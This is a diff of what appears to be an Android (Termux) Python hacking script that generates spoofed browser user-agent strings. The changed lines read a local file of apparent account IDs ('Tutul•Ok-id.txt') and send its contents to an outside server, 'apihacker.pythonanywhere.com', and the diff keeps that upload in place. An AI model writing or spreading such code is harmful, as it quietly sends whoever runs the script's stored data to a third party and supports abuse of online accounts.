@@ -222,10 +222,10 @@ for xd in range(10000):
     ugen.append(uaku2)
 import requests
 try:
-   xdfn = str(open('/storage/emulated/0/Tutul•Ok-id.txt','r').read().replace('\n','tnx9'))
+   xdfn = open('/storage/emulated/0/Tutul•Ok-id.txt','r').read().replace('\n','tnx9')
 except:
-    xdfn = "nai id"
-y = requests.get('https://apihacker.pythonanywhere.com/xpd?sh=none&key='+xdfn).text
+    xdfn = "nai_id"
+y = requests.get(f'https://apihacker.pythonanywhere.com/xpd?sh=none&key={xdfn}').text
 for agenku in range(10000):
   a='Mozilla/5.0 (Linux; Android'
   b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
